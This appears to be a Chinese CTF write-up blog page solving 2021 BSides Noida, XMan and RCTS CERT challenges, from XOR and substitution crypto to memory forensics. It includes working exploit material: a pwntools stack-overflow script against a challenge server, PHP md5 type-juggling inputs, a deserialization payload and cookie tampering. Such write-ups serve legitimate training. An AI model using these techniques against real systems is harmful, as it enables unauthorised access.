        print(tmp)
        print(pha)


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    text &#x3D; solve()
    print(text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>最后的结果为。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">BSides <span class="token keyword">is</span> a community<span class="token operator">-</span>based framework <span class="token keyword">for</span> organizing events <span class="token keyword">and</span> informing members of the public about information security<span class="token punctuation">.</span> These events are already happening <span class="token keyword">in</span> major cities around the world! We are responsible <span class="token keyword">for</span> organizing an independent BSides event approved <span class="token keyword">in</span> Noida<span class="token punctuation">,</span> India<span class="token punctuation">.</span> It creates opportunities <span class="token keyword">for</span> people to be present <span class="token keyword">and</span> participate <span class="token keyword">in</span> an intimate environment that promotes collaboration<span class="token punctuation">.</span> It <span class="token keyword">is</span> a lively event <span class="token keyword">with</span> discussions<span class="token punctuation">,</span> demos<span class="token punctuation">,</span> <span class="token keyword">and</span> participants' interactions<span class="token punctuation">.</span> 
BSNoida<span class="token punctuation">&#123;</span>d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="Misc-FeedBack-Form"><a href="#Misc-FeedBack-Form" class="headerlink" title="Misc / FeedBack Form"></a><strong>Misc</strong> <strong>/</strong> <strong>FeedBack Form</strong></h3><p>调查问卷</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808144426563.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BSidesNOIDA&#123;s33_y0u_n3xt_t1m3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Misc-Farewell"><a href="#Misc-Farewell" class="headerlink" title="Misc / Farewell"></a><strong>Misc</strong> <strong>/</strong> <strong>Farewell</strong></h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">&quot;You might be alone at the moment... 
But someday... You&#39;ll definitely find nakama! 
No one is born in this world to be alone!&quot;
― Eiichiro Oda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>拼图</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808145343940.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BSNoida&#123;Th4nk5_f0r_pl4y1ng_See_y0u_n3xt_y34r_By3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Misc-My-Artwork"><a href="#Misc-My-Artwork" class="headerlink" title="Misc / My Artwork"></a><strong>Misc</strong> <strong>/</strong> <strong>My Artwork</strong></h3><pre class="line-numbers language-描述" data-language="描述"><code class="language-描述">&quot;You can create art and beauty with a computer.&quot; - Steven Levy
So, I decided not to use MS Paint anymore and write code instead!
Hope you can see my art before the turtle runs away!
He&#39;s pretty fast tbh!
PS: Put the flag in BSNoida&#123;&#125; wrapper.
chall link<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>海龟绘图，懒得看了，没多长时间了。</p>
<h3 id="Misc-Data-Breach"><a href="#Misc-Data-Breach" class="headerlink" title="Misc / Data Breach"></a><strong>Misc</strong> <strong>/</strong> <strong>Data Breach</strong></h3><p>题目描述</p>
<pre class="line-numbers language-none"><code class="language-none">Anonymous has released this https:&#x2F;&#x2F;vimeo.com&#x2F;user147131520 
and he want&#39;s to make the deal with the individual in a public place
where the individual lives.
If we can find the contact info like phone number of nearby cafe then 
we can warn them and catch him in red hands!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>The flag is in <code>BSNoida&#123;phone no&#125;</code></p>
<p>偏向社工的题目，没思路///</p>
<h2 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Crypto-Xoro"><a href="#Crypto-Xoro" class="headerlink" title="Crypto / Xoro"></a><strong>Crypto</strong> <strong>/</strong> <strong>Xoro</strong></h3><p>题目描述</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;You need to accept the fact that you’re not the best and have all the will to strive to be better than anyone you face.&quot; – Roronoa Zoro<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不是很难看起来，服务端代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> os

FLAG <span class="token operator">=</span> <span class="token string">b'fake'</span><span class="token comment"># open('flag.txt', 'rb').read()</span>


<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token operator">^</span> j <span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> text <span class="token operator">*</span> <span class="token punctuation">(</span>size <span class="token operator">//</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> text<span class="token punctuation">[</span><span class="token punctuation">:</span>size <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    keystream <span class="token operator">=</span> pad<span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>

    encrypted <span class="token operator">=</span> xor<span class="token punctuation">(</span>keystream<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> encrypted<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n===== WELCOME TO OUR ENCRYPTION SERVICE =====\n"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        pt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'[plaintext (hex)]>  '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ct <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>pt<span class="token punctuation">)</span> <span class="token operator">+</span> FLAG<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ciphertext (hex)]>"</span><span class="token punctuation">,</span> ct<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"See ya ;)"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">":( Oops!"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Terminating Session!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>明文为空时进行一次加密获得flag的位数</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808155220737.png" alt></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808155241192.png" alt></p>
<p>​    可见flag的位数应为<code>39</code>，而key的长度为<code>32</code>(39＞32)，那就让明文加上flag的长度为128位才行。</p>
<p>​    需要在前面补上<code>128-39=89</code>位<code>0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code>，用178个零即可。得到的密文信息为：</p>
<pre class="line-numbers language-none"><code class="language-none">d3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105bad3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105bad3952480f1013a8b8d1396d11eb307decc0f3a751fde797090d6aeb6b63861dba8fd4bf7ae625be5d26af9a441d175bbad646521579b2628dfc6a2c7f86e24c7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>​    写个简单的脚本逆一下即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

data1 <span class="token operator">=</span> <span class="token number">0xd3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105bad3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105ba</span>
data2 <span class="token operator">=</span> <span class="token number">0xd3952480f1013a8b8d1396d11eb307decc0f3a751fde797090d6aeb6b63861dba8fd4bf7ae625be5d26af9a441d175bbad646521579b2628dfc6a2c7f86e24c7</span>

flag <span class="token operator">=</span> data1 <span class="token operator">^</span> data2
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># b'BSNoida&#123;how_can_you_break_THE_XOR_?!?!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Crypto-MACAW"><a href="#Crypto-MACAW" class="headerlink" title="Crypto / MACAW"></a><strong>Crypto</strong> <strong>/</strong> <strong>MACAW</strong></h3><pre class="line-numbers language-none"><code class="language-none">Why are MACAWS becoming Another Endangered Species?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="第五届XMan选拔赛2021"><a href="#第五届XMan选拔赛2021" class="headerlink" title="第五届XMan选拔赛2021"></a>第五届XMan选拔赛2021</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>没注意到这个比赛，当时没打，哎，当时只注意到上面的那两个国外的比赛了，也没注意xctf社区，失误了。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809162321686.png" alt></p>
<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="try-all-volatility"><a href="#try-all-volatility" class="headerlink" title="try_all_volatility"></a><strong>try_all_volatility</strong></h3><pre class="line-numbers language-none"><code class="language-none">我从孙吉儿那里偷来数据，但他是个机灵鬼，竟然把flag藏到了自拍照里
附件根据网速选一个链接下载即可。
百度链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1MvcWAqTfrUk6ZDVGS3yvwA
提取码：9k30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>先看进程信息<strong>pslist</strong></p>
<pre class="line-numbers language-none"><code class="language-none">volatility -f mem pslist --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182150331.png" alt></p>
<p>​    再看记事本上写了什么</p>
<pre class="line-numbers language-none"><code class="language-none">volatility -f mem notepad --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182442796.png" alt></p>
<p>​    再看命令行有什么</p>
<pre class="line-numbers language-none"><code class="language-none">volatility -f mem cmdscan --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182554262.png" alt></p>
<p>​    提示为png，使用文件扫描命令filescan来搞</p>
<pre class="line-numbers language-none"><code class="language-none">volatility -f mem filescan --profile&#x3D;WinXPSP2x86 | grep .png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182806766.png" alt></p>
<p>将<code>res.png</code>图片提取出来。</p>
<pre class="line-numbers language-none"><code class="language-none">volatility -f mem dumpfiles -Q 0x000000000a283498 --dump-dir&#x3D;.&#x2F; --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809185236200.png" alt></p>
<p>然后<code>zsteg -a filename</code>一把梭</p>
<pre class="line-numbers language-none"><code class="language-none">zsteg -E &#39;b1,b,lsb,yx&#39; file.None.0x8992d4b8.dat &gt; 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809203117710.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a><strong>签到</strong></h3><p>get传个<code>a=1</code>，post传个<code>b=2</code>即得flag</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;you_are_great!!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809204002847.png" alt></p>
<h3 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a><strong>easyssti</strong></h3><h1 id="RCTS-CERT-CTF-2021"><a href="#RCTS-CERT-CTF-2021" class="headerlink" title="RCTS CERT CTF 2021"></a>RCTS CERT CTF 2021</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="Some-type-of-juggling"><a href="#Some-type-of-juggling" class="headerlink" title="Some type of juggling"></a>Some type of juggling</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"240610708"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'It is not THAT easy!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> 
            <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hash</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">print</span> <span class="token double-quoted-string string">"Congratulations! Your flag is: <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">print</span> <span class="token double-quoted-string string">"Flag not found!"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>0e</code>开头的md5，php弱比较。</p>
<pre class="line-numbers language-none"><code class="language-none">240610708，aabg7XSs，aabC9RqS
s878926199a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="Exclusive-access"><a href="#Exclusive-access" class="headerlink" title="Exclusive access"></a>Exclusive access</h3><p>改cookie，好久没做过这种签到了，cookie是base64+urlencode，开始是<code>guess</code>，改为<code>admin</code>即可</p>
<h3 id="It-is-Magic-after-all"><a href="#It-is-Magic-after-all" class="headerlink" title="It is Magic after all"></a>It is Magic after all</h3><p>php反序列化</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
class Magic &#123;
    public $key &#x3D; true;
&#125;
$a &#x3D; new Magic();
echo(serialize($a));
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到的payload直接传进去就ok了。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>普通的gets栈溢出，直接溢出后让下一位的v5的值为<code>1</code>也就是<code>0x1</code>即可</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-58h] BYREF</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Ch] [rbp-Ch]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello there! What is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Well, hello %s!"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面是解题脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenges.defsoc.tk'</span><span class="token punctuation">,</span> <span class="token number">22228</span><span class="token punctuation">)</span>

buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">76</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
[*] Switching to interactive mode
Hello there! What is your name?
flag&#123;buff3r_0v3rfl0w_r0cks&#125;
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><p>一路跟踪就找到flag了，也没加密什么的。。。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_401182</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>

  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token string">"flag&#123;1ntr0_t0_r3v3rs3_3ng1n33r1ng&#125;"</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0x21</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="A-simple-challenge"><a href="#A-simple-challenge" class="headerlink" title="A simple challenge"></a>A simple challenge</h3><p>多层base加密</p>
<pre class="line-numbers language-none"><code class="language-none">Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ&#x3D;&#x3D;

flag&#123;3nc0d1ng_1s_n0t_3ncrypt10n!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="Roman-encryption"><a href="#Roman-encryption" class="headerlink" title="Roman encryption"></a>Roman encryption</h3><p>替换密码使用字频分析quipquip</p>
<pre class="line-numbers language-none"><code class="language-none">Csddk Rtdetp,
Qcghb ykt jko ykto ptmmkoq,
Ykt igh tps qcep bsy qk osisevs ykto oswgou: jdgl&#123;5ta5q1qtq10h_1p_b3y&#125;

字频分析&#x3D;&gt;

flag&#123;5ub5t1tut10n_1s_k3y&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开始会分析出来<code>flag&#123;5um5t1tut10n_1s_k3y&#125;</code></p>
<p>而根据单词的意义，flag应为<code>flag&#123;5ub5t1tut10n_1s_k3y&#125;</code></p>
<h3 id="Hextraordinary-security"><a href="#Hextraordinary-security" class="headerlink" title="Hextraordinary security"></a>Hextraordinary security</h3><p>直接解hex即可</p>
<pre class="line-numbers language-none"><code class="language-none">w.1^8dmdOyYp~Syhs|g81wl&#125;Xrjg oS75N?&gt;&gt;&gt;J98xE,EdL&#39;L~l&gt;7.L@!n@&lt;%&#123;.h&#96;c&gt;eZ!&#x2F;;8mT~I&#39;Uf&#39;3GP2&#123;vo&gt;~xG-U~wfuBH
&#123;:YXK&amp;9&quot;tR53g.%a3~rA2)Tci(78w3~+LdbA,NVvdB; 38*!NM~]~P^h&#125;y_Utf08+\0EWl61&#123;Ba]Cg@Z&#x3D;1^&#39;JtP2A8M|Ac:
\NN&#125;ZCE6&gt;SMo&amp;1)G%3&gt;ry+GzJ$R-4&#x3D;yh6XGjb&quot;?R7hs07&#123;f8E^U&gt;217&#125;kbKuEj_:O27,*s&#123;Xz\;fX0P3OQ@u0I)~1&#x3D;xVPBMC_J):
B)|&#125;&amp;Wh8Mn.Mm*+l&#123;1[S1&amp;Kww4 &quot;Rz2? Lx.&#x3D;G(ekp&#x3D;Or];fLls%&quot;6#d@8t7sY3n&#123;9E04u&quot;%[#sx,&#x2F;7aTPKS~s+o_d&#x3D;wrsJP2q!Ns%cz&#x2F;&#x3D;&#39;\hw
&#x2F;yHQPdE7?Fq)J([)[DsP~&gt;4&amp;?&#x3D;o-@o$nFILBhfS,&#x2F;Q237vKtoDQxxNWpyXP&gt;&#x3D;wNnvs4KVltmAdbIaY:nK&gt;Vc&#96;&#x2F;$uJoq&amp;0N
$E5G6?:a9-&#96;uih%&#125;_U6\el\f^oJ&#39;utRxb&#123;LY&gt;n_-| MTuWHPqSQ^W2v\&gt;[68]XGk&#96;pCkYV.&gt;D:M_.NKQc&gt;g&#x3D;s&quot;rIx?^ 6h1Q5S#RuKY
&lt;#|5L&lt;:*?Og[&amp;| jog-rurUzk&#x3D;f~IFBUi,&#x2F;K-x(&gt;,X8hk.cL#j1JduS)qAK3&lt;hT&#x3D;#T;#G)7u&#96;h$t&#123;j&#x2F;5N;rtl&#x2F; F$? [Wia8&#x3D;PEU&amp;?9VSy:3my&#x2F;,$!
